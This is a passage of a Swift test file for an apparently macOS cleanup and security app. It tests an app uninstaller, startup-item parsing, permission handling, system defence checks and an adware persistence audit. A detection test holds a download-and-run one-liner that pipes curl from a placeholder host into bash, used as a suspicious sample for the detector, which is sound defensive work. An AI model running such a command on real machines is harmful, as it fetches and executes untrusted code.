        try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(count: size).write(to: url)
    }

    private func makeHome() -> URL {
        fm.temporaryDirectory.appending(path: "mv-uninstall-\(UUID().uuidString)")
    }

    @Test func findsAnAppsLeftoversByExactMatchOnly() throws {
        let home = makeHome()
        defer { try? fm.removeItem(at: home) }
        try put(home, "Library/Application Support/com.acme.notes/db.sqlite")
        try put(home, "Library/Application Support/Acme Notes/cache.bin")
        try put(home, "Library/Caches/com.acme.notes/blob")
        try put(home, "Library/Preferences/com.acme.notes.plist", size: 1_000)
        try put(home, "Library/Preferences/ByHost/com.acme.notes.ABC-123.plist", size: 1_000)
        try put(home, "Library/LaunchAgents/com.acme.notes.helper.plist", size: 1_000)
        try put(home, "Library/Saved Application State/com.acme.notes.savedState/data", size: 1_000)
        // Look-alikes that must NOT match.
        try put(home, "Library/Application Support/Acme Notes Pro/x")
        try put(home, "Library/Caches/com.acme.notesplus/x")
        try put(home, "Library/Preferences/com.acme.notes2.plist", size: 1_000)

        let items = AppInventory.leftovers(bundleID: "com.acme.notes", names: ["Acme Notes"], home: home)
        let paths = Set(items.map { $0.path.replacingOccurrences(of: home.path + "/", with: "") })
        #expect(paths == [
            "Library/Application Support/com.acme.notes",
            "Library/Application Support/Acme Notes",
            "Library/Caches/com.acme.notes",
            "Library/Preferences/com.acme.notes.plist",
            "Library/Preferences/ByHost/com.acme.notes.ABC-123.plist",
            "Library/LaunchAgents/com.acme.notes.helper.plist",
            "Library/Saved Application State/com.acme.notes.savedState",
        ])
        // Login items get a second look; data is safe to remove with the app.
        #expect(items.first { $0.path.hasSuffix("helper.plist") }?.tier == .review)
    }

    @Test func neverOpenedDetection() {
        let installed = Date(timeIntervalSinceReferenceDate: 800_000_000)
        #expect(AppInventory.isNeverOpened(lastUsed: installed.addingTimeInterval(5), created: installed))
        #expect(!AppInventory.isNeverOpened(lastUsed: installed.addingTimeInterval(86_400), created: installed))
        #expect(AppInventory.isNeverOpened(lastUsed: nil, created: installed))
    }

    @Test func nameMatchesRespectExactCase() throws {
        // The real bug: "Claude Code URL Handler" (executable "claude") matched Claude's "Claude"
        // folder because macOS folder names ignore case.
        let home = makeHome()
        defer { try? fm.removeItem(at: home) }
        try put(home, "Library/Application Support/Claude/big.db", size: 2_000_000)
        let handler = AppInventory.leftovers(bundleID: "com.anthropic.claude-code-url-handler", names: ["claude"], home: home)
        #expect(handler.isEmpty)
        let desktop = AppInventory.leftovers(bundleID: "com.anthropic.claudefordesktop", names: ["Claude"], home: home)
        #expect(desktop.count == 1)
    }

    @Test func sharedLeftoversBelongToNoOne() {
        let shared = JunkItem(path: "/Users/x/Library/Application Support/Shared", name: "App data", size: 10, tier: .safe)
        let own = JunkItem(path: "/Users/x/Library/Caches/com.a.one", name: "Cache", size: 5, tier: .safe)
        func app(_ id: String, _ items: [JunkItem]) -> InstalledApp {
            InstalledApp(path: "/Applications/\(id).app", name: id, bundleID: id, version: nil, appSize: 1, leftovers: items, lastUsed: nil, isAppStore: false)
        }
        let result = UninstallerModel.removingSharedLeftovers([app("com.a.one", [shared, own]), app("com.b.two", [shared])])
        #expect(result[0].leftovers == [own])
        #expect(result[1].leftovers.isEmpty)
    }

    @Test func orphanNotesAnInstalledSiblingAndSkipsToolCaches() throws {
        let home = makeHome()
        defer { try? fm.removeItem(at: home) }
        try put(home, "Library/HTTPStorages/com.openai.chat/data", size: 2_000_000)
        try put(home, "Library/Caches/org.swift.swiftpm/data", size: 2_000_000)
        let groups = AppInventory.orphans(home: home, installedIDs: ["com.openai.codex"], isInstalled: { _ in false })
        #expect(groups.map(\.id) == ["orphan-com.openai.chat"])
        #expect(groups[0].explanation.contains("com.openai.codex"))
    }

    @Test func genericNamesAreNeverUsedForMatching() {
        let names = AppInventory.candidateNames(displayName: "Visual Studio Code",
                                                info: ["CFBundleName": "Code", "CFBundleExecutable": "Electron"])
        #expect(names == ["Visual Studio Code", "Code"])
    }

    @Test func inspectsAnAppBundle() throws {
        let home = makeHome()
        defer { try? fm.removeItem(at: home) }
        let app = home.appending(path: "Applications/Acme Notes.app")
        try fm.createDirectory(at: app.appending(path: "Contents/MacOS"), withIntermediateDirectories: true)
        let plist: [String: Any] = ["CFBundleIdentifier": "com.acme.notes", "CFBundleName": "Acme Notes",
                                    "CFBundleShortVersionString": "2.4", "CFBundlePackageType": "APPL"]
        try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
            .write(to: app.appending(path: "Contents/Info.plist"))
        try Data(count: 3_000_000).write(to: app.appending(path: "Contents/MacOS/Acme Notes"))
        try put(home, "Library/Caches/com.acme.notes/blob", size: 2_000_000)

        let inspected = AppInventory.inspect(app, home: home)
        #expect(inspected.name == "Acme Notes" && inspected.bundleID == "com.acme.notes" && inspected.version == "2.4")
        #expect(inspected.appSize >= 3_000_000 && inspected.dataSize >= 2_000_000)
        #expect(inspected.totalSize == inspected.appSize + inspected.dataSize)
        #expect(!inspected.isAppStore)
        // Spotlight reports a just-created, never-opened bundle's install date as "last used".
        // We detect that: it's "never opened", but not "unused for 6 months" (installed just now).
        #expect(inspected.neverOpened)
        #expect(!inspected.isUnused())
        #expect(AppInventory.appBundles(home: home).map(\.lastPathComponent).contains("Acme Notes.app"))
    }

    @Test func findsLeftoversOfDeletedAppsOnly() throws {
        let home = makeHome()
        defer { try? fm.removeItem(at: home) }
        try put(home, "Library/Application Support/com.gone.app/data", size: 2_000_000)
        try put(home, "Library/Caches/com.gone.app/blob")
        try put(home, "Library/Preferences/com.gone.app.plist", size: 2_000)
        try put(home, "Library/Containers/com.still.here/data", size: 2_000_000)      // installed
        try put(home, "Library/Caches/com.still.here.helper/blob", size: 2_000_000)   // helper of installed app
        try put(home, "Library/Caches/com.apple.Safari/blob", size: 2_000_000)       // Apple: never touched
        try put(home, "Library/Caches/tiny.gone.crumb/x", size: 1_000)               // too small to bother
        try put(home, "Library/Application Support/Slack/data", size: 2_000_000)     // not a bundle ID: can't know

        let groups = AppInventory.orphans(home: home, installedIDs: ["com.still.here"], isInstalled: { _ in false })
        #expect(groups.map(\.id) == ["orphan-com.gone.app"])
        #expect(groups[0].title == "Gone")
        #expect(groups[0].items.count == 3)
        #expect(groups[0].items.allSatisfy { $0.tier == .review })
    }

    @Test func bundleIDHeuristicsAndNames() {
        #expect(AppInventory.looksLikeBundleID("com.spotify.client"))
        #expect(!AppInventory.looksLikeBundleID("Slack"))
        #expect(!AppInventory.looksLikeBundleID("com.acme"))
        #expect(!AppInventory.looksLikeBundleID("My App.backup.old"))
        #expect(AppInventory.prettyName(for: "com.spotify.client") == "Spotify")
        #expect(AppInventory.prettyName(for: "com.hnc.Discord") == "Discord")
        #expect(AppInventory.prettyName(for: "org.whispersystems.signal-desktop") == "Signal Desktop")
    }

    @Test func uninstallGoesToTrashAndCanBePutBack() throws {
        let home = makeHome()
        defer { try? fm.removeItem(at: home) }
        try put(home, "Applications/Throwaway.app/Contents/MacOS/Throwaway", size: 1_500_000)
        try put(home, "Library/Caches/com.throwaway.app/blob", size: 1_500_000)
        let items = [
            JunkItem(path: home.appending(path: "Applications/Throwaway.app").path, name: "Throwaway.app", size: 1_500_000, tier: .review),
            JunkItem(path: home.appending(path: "Library/Caches/com.throwaway.app").path, name: "Cache", size: 1_500_000, tier: .safe),
        ]
        let record = CleanupRemover.remove(items, permanently: false)
        #expect(record.entries.count == 2 && items.allSatisfy { !fm.fileExists(atPath: $0.path) })
        #expect(CleanupRemover.putBack(record) == 2)
        #expect(items.allSatisfy { fm.fileExists(atPath: $0.path) })
    }
}

@Suite("Startup items")
struct StartupItemsTests {
    /// Real `sfltool dumpbtm` output shape, trimmed.
    private let sample = """
    ========================
     Records for UID -2 : FFFFEEEE-DDDD-CCCC-BBBB-AAAAFFFFFFFE
    ========================

     Items:

     #2:
                     UUID: 8D6D22CC-24BD-470E-9CB9-613E982FD62D
                     Name: com.macpaw.CleanMyMac5.Agent
           Developer Name: MacPaw Inc.
          Team Identifier: S8EX82NJP6
                     Type: legacy daemon (0x10010)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 16.com.macpaw.CleanMyMac5.Agent
                      URL: /Library/LaunchDaemons/com.macpaw.CleanMyMac5.Agent.plist
          Executable Path: /Library/PrivilegedHelperTools/com.macpaw.CleanMyMac5.Agent
                 Last Use: 2026-09-25 11:05:55-07:00
        Parent Identifier: MacPaw Inc.

    ========================
     Records for UID 501 : 8ED67105-027E-4B86-88F6-CBD9BD7CFB64
    ========================

     Items:

     #1:
                     Name: CleanMyMac
           Developer Name: MacPaw Inc.
                     Type: app (0x2)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 2.com.macpaw.CleanMyMac5
                      URL: /Applications/CleanMyMac.app
      Embedded Item Identifiers:
        #1: 4.com.macpaw.CleanMyMac5.Menu

     #2:
                     Name: ollama
           Developer Name: (null)
                     Type: legacy agent (0x10008)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 8.homebrew.mxcl.ollama
                      URL: /Users/501/Library/LaunchAgents/homebrew.mxcl.ollama.plist
          Executable Path: /opt/homebrew/opt/ollama/bin/ollama
                 Last Use: 2026-09-25 11:05:55-07:00
        Parent Identifier: Unknown Developer

     #3:
                     Name: CleanMyMac Menu
           Developer Name: MacPaw Inc.
                     Type: login item (0x4)
              Disposition: [disabled, allowed, notified] (0xa)
               Identifier: 4.com.macpaw.CleanMyMac5.Menu
                      URL: Contents/Library/LoginItems/CleanMyMac_5_Menu.app
        Bundle Identifier: com.macpaw.CleanMyMac5.Menu
        Parent Identifier: 2.com.macpaw.CleanMyMac5

     #4:
                     Name: GoogleUpdater
           Developer Name: Google LLC
                     Type: legacy agent (0x10008)
              Disposition: [enabled, allowed, not notified] (0x3)
               Identifier: 8.com.google.GoogleUpdater.wake
                      URL: /Users/501/Library/LaunchAgents/com.google.GoogleUpdater.wake.plist
          Executable Path: /Users/501/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater

     #5:
                     Name: QuickLookShareExtension (Global).appex
                     Type: quicklook (0x800)
               Identifier: 2048.com.canva.affinity.quicklook
    """

    @Test func parsesRecordsTypesAndDispositions() {
        let records = BTMParser.parse(sample)
        #expect(records.count == 6)
        let daemon = records[0]
        #expect(daemon.uid == -2 && daemon.kind == .daemon && daemon.label == "com.macpaw.CleanMyMac5.Agent")
        #expect(daemon.isEnabled && daemon.lastUse != nil)
        #expect(records[3].kind == .loginItem && !records[3].isEnabled)
        #expect(records[5].kind == nil)   // Quick Look extensions don't run at startup
        #expect(records[2].developer == nil)  // "(null)" becomes nil
    }

    @Test func buildsFriendlyItems() {
        let items = StartupInventory.items(from: [.parsed(BTMParser.parse(sample))], uid: 501, home: "/Users/tyler",
                                           running: ["homebrew.mxcl.ollama"], disabledLabels: [])
        let byLabel = Dictionary(uniqueKeysWithValues: items.map { ($0.label, $0) })
        #expect(items.count == 4)   // daemon, ollama, login item, updater (extension excluded)

        let ollama = try! #require(byLabel["homebrew.mxcl.ollama"])
        #expect(ollama.plistPath == "/Users/tyler/Library/LaunchAgents/homebrew.mxcl.ollama.plist") // /Users/501 → real home
        #expect(ollama.isRunning && ollama.isUserManageable == false) // not *this* test runner's home
        #expect(ollama.purpose.hasPrefix("Homebrew service: ollama"))

        let menu = try! #require(byLabel["com.macpaw.CleanMyMac5.Menu"])
        #expect(menu.appName == "CleanMyMac" && menu.appPath == "/Applications/CleanMyMac.app")
        #expect(menu.kind == .loginItem && !menu.isEnabled && menu.schedule == .atLogin)

        let updater = try! #require(byLabel["com.google.GoogleUpdater.wake"])
        #expect(updater.isBroken)   // its program doesn't exist at /Users/tyler/... in the test
        #expect(updater.purpose.hasPrefix("Its app is gone"))  // broken wins over "updater"

        // With a program that exists, it's explained as an updater.
        let working = StartupItem(label: "com.google.GoogleUpdater.wake", name: "GoogleUpdater", kind: .agent,
                                  developer: "Google LLC", appName: "Google Chrome", appPath: nil, plistPath: nil,
                                  executablePath: "/bin/ls", isEnabled: true, lastRun: nil)
        #expect(working.purpose == "Keeps Google Chrome up to date. Usually safe to turn off; most apps also check for updates when you open them.")
    }

    @Test func schedulesFromPlist() {
        #expect(StartupInventory.schedule(of: ["KeepAlive": true]) == .alwaysRunning)
        #expect(StartupInventory.schedule(of: ["KeepAlive": ["SuccessfulExit": false]]) == .alwaysRunning)
        #expect(StartupInventory.schedule(of: ["StartInterval": 3600]) == .every(3600))
        #expect(StartupInventory.schedule(of: ["StartCalendarInterval": ["Hour": 3]]) == .calendar)
        #expect(StartupInventory.schedule(of: ["RunAtLoad": true]) == .atLogin)
        #expect(StartupInventory.schedule(of: ["MachServices": ["x": true]]) == .onDemand)
        #expect(StartupItem.Schedule.every(3600).text == "Runs every 60 minutes")
        #expect(StartupItem.Schedule.every(14_400).text == "Runs every 4 hours")
    }

    @Test func parsesLaunchctlOutput() {
        let list = "PID\tStatus\tLabel\n412\t0\thomebrew.mxcl.ollama\n-\t0\tcom.google.GoogleUpdater.wake\n"
        #expect(StartupInventory.parseLaunchctlList(list) == ["homebrew.mxcl.ollama"])
        let disabled = """
        \tdisabled services = {
        \t\t"com.adobe.GC.AGM" => enabled
        \t\t"com.macvitals.test" => disabled
        \t\t"com.old.style" => true
        \t}
        """
        #expect(StartupInventory.parseDisabled(disabled) == ["com.macvitals.test", "com.old.style"])
    }

    @Test func genericHelperNamesUseTheirApp() {
        #expect(StartupInventory.friendlyName("LaunchAgent", appName: "Logi Options+") == "Logi Options+ helper")
        #expect(StartupInventory.friendlyName("Launcher.app", appName: "ColorSlurp") == "ColorSlurp helper")
        #expect(StartupInventory.friendlyName("CleanMyMac Menu", appName: "CleanMyMac") == "CleanMyMac Menu")
        #expect(StartupInventory.friendlyName("com.microsoft.teams2.agent", appName: "Microsoft Teams") == "Microsoft Teams helper")
    }

    @Test func homePathTranslation() {
        #expect(StartupInventory.resolveHome("/Users/501/Library/LaunchAgents/x.plist", uid: 501, home: "/Users/tyler")
                == "/Users/tyler/Library/LaunchAgents/x.plist")
        #expect(StartupInventory.resolveHome("/Library/LaunchDaemons/x.plist", uid: 501, home: "/Users/tyler")
                == "/Library/LaunchDaemons/x.plist")
    }
}

@Suite("Rolling text")
@MainActor
struct RollingTextTests {
    private func glyphs(_ view: RollingTextView) -> [CALayer] {
        (view.layer?.sublayers?.first?.sublayers ?? []).sorted { $0.position.x < $1.position.x }
    }

    private func snapshot(_ view: RollingTextView, _ name: String) {
        guard let dir = ProcessInfo.processInfo.environment["SNAPSHOT_DIR"], let layer = view.layer else { return }
        let scale: CGFloat = 2
        let size = CGSize(width: view.bounds.width * scale, height: view.bounds.height * scale)
        guard let ctx = CGContext(data: nil, width: Int(size.width), height: Int(size.height), bitsPerComponent: 8,
                                  bytesPerRow: 0, space: CGColorSpaceCreateDeviceRGB(),
                                  bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return }
        ctx.setFillColor(NSColor.white.cgColor)
        ctx.fill(CGRect(origin: .zero, size: size))
        ctx.scaleBy(x: scale, y: scale)
        layer.render(in: ctx)
        if let image = ctx.makeImage() {
            let rep = NSBitmapImageRep(cgImage: image)
            try? rep.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: dir).appendingPathComponent("\(name).png"))
        }
    }

    @Test func onlyChangedCharactersAreReplaced() {
        let view = RollingTextView(frame: CGRect(x: 0, y: 0, width: 120, height: 40))
        let font = RollingTextView.font(size: 30, weight: .bold, rounded: true)
        view.update(text: "9%", font: font, color: .black, alignment: .center, animated: true)
        view.layout()
        #expect(glyphs(view).count == 2)
        snapshot(view, "rolling-9")
        let percent = glyphs(view).last

        view.update(text: "10%", font: font, color: .black, alignment: .center, animated: false)
        view.layout()
        let after = glyphs(view)
        #expect(after.count == 3)
        #expect(after.last === percent) // the "%" is kept and slides; only digits change
        #expect(zip(after, after.dropFirst()).allSatisfy { $0.frame.maxX <= $1.frame.minX + 0.5 })
        snapshot(view, "rolling-10")

        // Animated change: the old digit stays (fading out) until its roll finishes.
        view.update(text: "12%", font: font, color: .black, alignment: .center, animated: true)
        view.layout()
        #expect(glyphs(view).count == 4)
        #expect(glyphs(view).filter { $0.opacity > 0 }.count == 3)
    }

    @Test func naturalSizeFitsTheText() {
        let font = RollingTextView.font(size: 30, weight: .bold, rounded: true)
        let wide = RollingTextView.naturalSize("100%", font: font)
        let narrow = RollingTextView.naturalSize("9%", font: font)
        #expect(wide.width > narrow.width)
        #expect(wide.height == narrow.height)
        // Monospaced digits: every digit is the same width, so columns don't jitter.
        #expect(RollingTextView.width(of: "1", font: font) == RollingTextView.width(of: "8", font: font))
    }
}

@Suite("Permissions")
struct PermissionTests {
    private func posix(_ code: Int32) -> Error {
        NSError(domain: NSCocoaErrorDomain, code: NSFileWriteNoPermissionError,
                userInfo: [NSUnderlyingErrorKey: NSError(domain: NSPOSIXErrorDomain, code: Int(code))])
    }

    @Test func blockedRemovalsAreClassifiedByWhatFixesThem() {
        // macOS privacy (EPERM) on an app bundle → App Management.
        #expect(CleanupRemover.blocker(for: posix(EPERM), path: "/Applications/Foo.app", hasFullDiskAccess: true) == .appManagement)
        // EPERM elsewhere → Full Disk Access, unless it's already on.
        #expect(CleanupRemover.blocker(for: posix(EPERM), path: "/Users/me/Library/Mail/V10", hasFullDiskAccess: false) == .fullDiskAccess)
        #expect(CleanupRemover.blocker(for: posix(EPERM), path: "/Users/me/Library/Mail/V10", hasFullDiskAccess: true) == .other)
        // Ordinary ownership (EACCES) → installed for all users → Finder with a password.
        #expect(CleanupRemover.blocker(for: posix(EACCES), path: "/Applications/zoom.us.app", hasFullDiskAccess: true) == .admin)
        #expect(CleanupRemover.blocker(for: posix(EACCES), path: "/Library/LaunchDaemons/x.plist", hasFullDiskAccess: true) == .admin)
        #expect(CleanupRemover.blocker(for: posix(EBUSY), path: "/tmp/x", hasFullDiskAccess: true) == .other)
    }

    @Test func findsPosixCodeDeepInTheErrorChain() {
        let nested = NSError(domain: NSCocoaErrorDomain, code: 1, userInfo: [
            NSUnderlyingErrorKey: NSError(domain: "Other", code: 2, userInfo: [
                NSUnderlyingErrorKey: NSError(domain: NSPOSIXErrorDomain, code: Int(EACCES)),
            ]),
        ])
        #expect(CleanupRemover.posixCode(of: nested) == EACCES)
        #expect(CleanupRemover.posixCode(of: NSError(domain: "x", code: 1)) == nil)
    }

    @Test func finderResultsPairWithRequestedItems() {
        let items = [
            FailedItem(name: "Zoom", path: "/Applications/zoom.us.app", size: 100, blocker: .admin),
            FailedItem(name: "Helper", path: "/Library/LaunchDaemons/a.plist", size: 1, blocker: .admin),
        ]
        // In order, one answer per item.
        let ordered = FinderRemover.match(items, trashedPaths: ["/Users/me/.Trash/zoom.us.app", "/Users/me/.Trash/a.plist"],
                                          cancelled: false, exists: { _ in false })
        #expect(ordered.entries.map(\.trashedPath) == ["/Users/me/.Trash/zoom.us.app", "/Users/me/.Trash/a.plist"])
        #expect(ordered.remaining.isEmpty)
        // Cancelled password prompt: nothing moved, everything still to do.
        let cancelled = FinderRemover.match(items, trashedPaths: [], cancelled: true, exists: { _ in true })
        #expect(cancelled.cancelled && cancelled.entries.isEmpty && cancelled.remaining.count == 2)
        // Partial: only the helper went; match by name.
        let partial = FinderRemover.match(items, trashedPaths: ["/Users/me/.Trash/a.plist"], cancelled: false,
                                          exists: { $0.hasSuffix(".app") })
        #expect(partial.entries.map(\.name) == ["Helper"])
        #expect(partial.entries.first?.trashedPath == "/Users/me/.Trash/a.plist")
        #expect(partial.remaining.map(\.name) == ["Zoom"])
    }

    @Test func olderHistoryWithoutFailureReasonsStillLoads() throws {
        let json = """
        [{"id":"6F1C2A8E-1B7C-4B7A-9C55-1E2D3C4B5A69","date":0,"entries":[],"failures":["Old thing"]}]
        """
        let records = try JSONDecoder().decode([CleanupRecord].self, from: Data(json.utf8))
        #expect(records.first?.failures == ["Old thing"])
        #expect(records.first?.failedItems == nil)
        #expect(records.first?.failed(.admin).isEmpty == true)
    }

    @Test func everyPermissionIsExplained() {
        for kind in PermissionKind.allCases {
            #expect(!kind.benefit.isEmpty && !kind.explanation.isEmpty && !kind.unlocks.isEmpty && !kind.privacyNote.isEmpty)
            #expect(kind.settingsURL.absoluteString.hasPrefix("x-apple.systempreferences:com.apple.preference.security?Privacy_"))
        }
        #expect(PermissionKind.allCases.filter(\.isRecommended) == [.fullDiskAccess])
    }
}

@Suite("Scan orb")
@MainActor
struct ScanOrbTests {
    private func animationCount(_ view: ScanSweepView) -> Int {
        (view.layer?.sublayers ?? []).reduce(0) { $0 + ($1.animationKeys()?.count ?? 0) }
    }

    @Test func sweepRunsOnlyWhileScanning() {
        let view = ScanSweepView(frame: CGRect(x: 0, y: 0, width: 100, height: 100))
        view.update(scanning: false, animated: true, color: .systemMint)
        view.layout()
        #expect(animationCount(view) == 0)

        view.update(scanning: true, animated: true, color: .systemMint)
        #expect(animationCount(view) == 4) // one sweep + three ripples, all in the render server
        view.update(scanning: true, animated: true, color: .systemMint) // no-op, no restart
        #expect(animationCount(view) == 4)

        view.update(scanning: false, animated: true, color: .systemMint)
        #expect(animationCount(view) == 0)
    }

    @Test func respectsReducedMotion() {
        let view = ScanSweepView(frame: CGRect(x: 0, y: 0, width: 100, height: 100))
        view.update(scanning: true, animated: false, color: .systemMint)
        view.layout()
        #expect(animationCount(view) == 0)
    }
}

@Suite("Protection")
struct ProtectionTests {
    @Test func readsBuiltInDefences() {
        #expect(DefenceChecks.fileVault(output: "FileVault is On.").status == .on)
        #expect(DefenceChecks.fileVault(output: "FileVault is Off.").status == .off)
        #expect(DefenceChecks.fileVault(output: "FileVault is Off.").fixURL != nil)
        #expect(DefenceChecks.fileVault(output: "").status == .unknown)
        #expect(DefenceChecks.gatekeeper(output: "assessments enabled").status == .on)
        #expect(DefenceChecks.gatekeeper(output: "assessments disabled").status == .off)
        #expect(DefenceChecks.sip(output: "System Integrity Protection status: enabled.").status == .on)
        #expect(DefenceChecks.sip(output: "System Integrity Protection status: disabled.").status == .off)
        #expect(DefenceChecks.sip(output: "System Integrity Protection status: unknown (Custom Configuration).").status == .off)
    }

    @Test func firewallOffIsARecommendationNotAnAlarm() {
        let off = DefenceChecks.firewall(global: "Firewall is disabled. (State = 0)", stealth: "Firewall stealth mode is off")
        #expect(off.status == .recommended)
        #expect(!off.status.needsAttention)
        let on = DefenceChecks.firewall(global: "Firewall is enabled. (State = 1)", stealth: "Firewall stealth mode is on")
        #expect(on.status == .on)
        #expect(on.summary.contains("stealth"))
    }

    @Test func securityUpdatesDefaultToOnWhenUnset() {
        #expect(DefenceChecks.securityUpdates(preferences: [:]).status == .on)
        #expect(DefenceChecks.securityUpdates(preferences: ["CriticalUpdateInstall": true, "ConfigDataInstall": true]).status == .on)
        let off = DefenceChecks.securityUpdates(preferences: ["ConfigDataInstall": false])
        #expect(off.status == .off)
        #expect(off.summary.contains("malware definitions"))
    }

    @Test func xprotectFreshness() {
        let now = ISO8601DateFormatter().date(from: "2026-09-25T12:00:00Z")!
        let fresh = DefenceChecks.xprotect(output: "Version: 5360 Installed: 2026-09-18 22:36:12 +0000", bundleVersion: nil, now: now)
        #expect(fresh.status == .on)
        #expect(fresh.summary.contains("6 days ago"))
        let stale = DefenceChecks.xprotect(output: "Version: 5100 Installed: 2026-05-01 10:00:00 +0000", bundleVersion: nil, now: now)
        #expect(stale.status == .off)
        // No `xprotect` tool: fall back to the bundle's version.
        #expect(DefenceChecks.xprotect(output: "", bundleVersion: "5360", now: now).status == .on)
        #expect(DefenceChecks.xprotect(output: "", bundleVersion: nil, now: now).status == .unknown)
    }

    @Test func screenLockParsing() {
        #expect(DefenceChecks.screenLock(output: "2026-09-25 sysadminctl[1] screenLock delay is immediate").status == .on)
        #expect(DefenceChecks.screenLock(output: "screenLock delay is 60 seconds").summary.contains("1 minute"))
        #expect(DefenceChecks.screenLock(output: "screenLock delay is 3600 seconds").status == .recommended)
        #expect(DefenceChecks.screenLock(output: "screenLock is off").status == .off)
    }

    @Test func sharingFromListeningPorts() {
        let netstat = """
        Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
        tcp4       0      0  *.22                   *.*                    LISTEN
        tcp6       0      0  *.5900                 *.*                    LISTEN
        tcp4       0      0  127.0.0.1.3000         *.*                    LISTEN
        tcp4       0      0  192.168.1.5.52000      17.0.0.1.443           ESTABLISHED
        """
        let ports = DefenceChecks.parseListeningPorts(netstat)
        #expect(ports == [22, 5900, 3000])
        let check = DefenceChecks.sharing(listeningPorts: ports)
        #expect(check.status == .info)
        #expect(check.summary.contains("Remote Login") && check.summary.contains("Screen Sharing"))
        #expect(DefenceChecks.sharing(listeningPorts: [3000]).status == .on)
    }

    @Test func profilesWithoutManagementAreFlagged() {
        #expect(DefenceChecks.management(enrollment: "Enrolled via DEP: No\nMDM enrollment: No",
                                         profiles: "There are no configuration profiles installed for user 'x'").status == .on)
        #expect(DefenceChecks.management(enrollment: "MDM enrollment: No",
                                         profiles: "_computerlevel[1] attribute: profileIdentifier: com.search.hijack").status == .off)
        #expect(DefenceChecks.management(enrollment: "MDM enrollment: Yes (User Approved)", profiles: "…").status == .info)
    }

    @Test func macOSUpdatesParsing() {
        #expect(DefenceChecks.macOSUpdates(output: "Software Update Tool\n\nFinding available software\nNo new software available.").status == .on)
        let pending = DefenceChecks.macOSUpdates(output: """
        Software Update found the following new or updated software:
        * Label: macOS Tahoe 26.1-25B78
        \tTitle: macOS Tahoe 26.1, Version: 26.1, Size: 1234K, Recommended: YES, Action: restart,
        """)
        #expect(pending.status == .off)
        #expect(pending.summary.contains("macOS Tahoe 26.1"))
        #expect(DefenceChecks.macOSUpdates(output: "Can't connect").status == .unknown)
    }

    @Test func signerNamesAreReadable() {
        #expect(CodeSignature.cleanSigner("Developer ID Application: Google LLC (EQHXZ8M8AV)") == "Google LLC")
        #expect(CodeSignature.cleanSigner("Apple Mac OS Application Signing") == "Mac App Store")
    }

    @Test func realAppSignaturesAreRecognized() {
        #expect(CodeSignature.check(path: "/System/Applications/Calculator.app").trust == .apple)
        #expect(CodeSignature.check(path: "/nonexistent.app").trust == .unknown)
    }

    // MARK: Startup items

    private func item(_ label: String, program: String? = nil, appPath: String? = nil) -> StartupItem {
        StartupItem(label: label, name: label, kind: .agent, developer: nil, appName: nil, appPath: appPath,
                    plistPath: nil, executablePath: program, isEnabled: true, lastRun: nil)
    }

    private let home = "/Users/me"
    private func verified(_: String) -> CodeSignature { CodeSignature(trust: .verifiedDeveloper, teamID: "T", signer: "Acme Inc") }
    private func adHoc(_: String) -> CodeSignature { CodeSignature(trust: .adHoc, teamID: nil, signer: nil) }

    @Test func verifiedHelpersAreFine() {
        let review = PersistenceAudit.review(item("com.acme.helper"), home: home,
                                             launch: .init(program: "/Applications/Acme.app/Contents/MacOS/helper", arguments: []),
                                             signatureCheck: verified)
        #expect(review.level == .fine)
        #expect(review.source == "Signed by Acme Inc")
        #expect(review.target == "/Applications/Acme.app") // judged as the whole app
    }

    @Test func homebrewToolsAreFineEvenIfAdHoc() {
        let review = PersistenceAudit.review(item("homebrew.mxcl.ollama"), home: home,
                                             launch: .init(program: "/opt/homebrew/opt/ollama/bin/ollama", arguments: ["serve"]),
                                             signatureCheck: adHoc)
        #expect(review.level == .fine)
        #expect(review.source == "Installed with Homebrew")
    }

    @Test func unsignedHelperIsWorthALook() {
        let review = PersistenceAudit.review(item("com.unknown.agent"), home: home,
                                             launch: .init(program: "/Library/Application Support/Unknown/agent", arguments: []),
                                             signatureCheck: adHoc)
        #expect(review.level == .review)
        #expect(review.concerns == [.adHoc])
    }

    @Test func adwarePatternsAreSuspicious() {
        // Hidden folder + not verified.
        let hidden = PersistenceAudit.review(item("com.update.service"), home: home,
                                             launch: .init(program: "/Users/me/Library/Application Support/.hidden/svc", arguments: []),
                                             signatureCheck: adHoc)
        #expect(hidden.level == .suspicious)
        #expect(hidden.concerns.contains(.hiddenFolder))
        // Runs from /tmp.
        let temp = PersistenceAudit.review(item("com.x"), home: home,
                                           launch: .init(program: "/private/tmp/x", arguments: []), signatureCheck: verified)
        #expect(temp.level == .suspicious)
        // Download-and-run one-liner.
        let oneLiner = PersistenceAudit.review(item("com.search.helper"), home: home,
                                               launch: .init(program: "/bin/bash", arguments: ["-c", "curl -s https://x.example/p | bash"]),
                                               signatureCheck: verified)
        #expect(oneLiner.level == .suspicious)
        #expect(oneLiner.concerns.contains(.downloadsAndRuns))
        // A script in a hidden folder, run by /usr/bin/env python3.
        let script = PersistenceAudit.review(item("com.y"), home: home,
                                             launch: .init(program: "/usr/bin/env", arguments: ["python3", "/Users/me/.config/y/run.py"]),
                                             signatureCheck: verified)
        #expect(script.concerns.contains(.runsScript(interpreter: "Python")))
        #expect(script.level == .suspicious)
    }

    @Test func dotFoldersFromPackageManagersAreNotFlagged() {
        let review = PersistenceAudit.review(item("com.z"), home: home,
                                             launch: .init(program: "/Users/me/.cargo/bin/tool", arguments: []), signatureCheck: adHoc)
        #expect(review.level == .fine)
        #expect(PersistenceAudit.isInHiddenFolder("/Users/me/.config/a/b", home: home))
        #expect(!PersistenceAudit.isInHiddenFolder("/Users/me/Library/.DS_Store", home: home)) // hidden file, not folder
        #expect(!PersistenceAudit.isInHiddenFolder("/opt/.x/y", home: home)) // outside home
    }
}

@Suite("Space Lens")
struct SpaceLensTests {
    private func makeTree() throws -> URL {
        let root = FileManager.default.temporaryDirectory.appending(path: "spacelens-\(UUID().uuidString)")
        let fm = FileManager.default
        try fm.createDirectory(at: root.appending(path: "big/inner"), withIntermediateDirectories: true)
        try fm.createDirectory(at: root.appending(path: "many"), withIntermediateDirectories: true)
